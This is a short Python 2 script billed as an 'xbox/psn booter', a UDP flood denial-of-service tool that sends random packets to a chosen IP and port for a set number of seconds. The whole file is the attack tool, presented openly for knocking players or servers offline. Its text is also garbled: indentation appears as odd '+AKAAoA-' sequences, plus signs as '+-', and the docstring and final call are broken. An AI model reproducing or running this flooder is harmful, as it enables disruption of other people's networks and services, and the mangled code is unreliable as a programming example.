#!/usr/bin/env python
# encoding: utf-8
"""
BradyPower.py
<!-- BradyPower is a powerful xbox/psn booter --!>

Created by Jxck Sec on 6/8/18.
Copyright (c) 2018 Copyright Holder. All rights reserved.
"""

BradyFlooder.

This is a 'Dos' attack program to attack servers, you set the IP

and the port and the amount of seconds and it will start flooding to that server.


Usage : ./flood_udp <ip> <port> <second>

"""

import time

import socket

import random

import sys


def usage():

+AKAAoACgAKA-print "Usage: " +- sys.argv[0] +- " <ip> <port> <second>"


def flood(victim, vport, duration):

+AKAAoACgAKA# okay so here I create the server, when i say "SOCK_DGRAM" it means it's a UDP type program

+AKAAoACgAKA-client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

+AKAAoACgAKA# 1024 representes one byte to the server

+AKAAoACgAKA-bytes = random._urandom(1024)

+AKAAoACgAKA-timeout = time.time() +- duration

+AKAAoACgAKA-sent = 0


+AKAAoACgAKA-while 1:

+AKAAoACgAKAAoACgAKAAoA-if time.time() > timeout:

+AKAAoACgAKAAoACgAKAAoACgAKAAoACg-break

+AKAAoACgAKAAoACgAKAAoA-else:

+AKAAoACgAKAAoACgAKAAoACgAKAAoACg-pass

+AKAAoACgAKAAoACgAKAAoA-client.sendto(bytes, (victim, vport))

+AKAAoACgAKAAoACgAKAAoA-sent = sent +- 1

+AKAAoACgAKAAoACgAKAAoA-print "Attacking %s sent packages %s at the port %s "%(sent, victim, vport)


def main():

+AKAAoACgAKA-print len(sys.argv)

+AKAAoACgAKA-if len(sys.argv) != 4:

+AKAAoACgAKAAoACgAKAAoA-usage()

+AKAAoACgAKA-else:

+AKAAoACgAKAAoACgAKAAoA-flood(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]))


if __name__ == '__main__':

+AKAAoACgAKA-main

()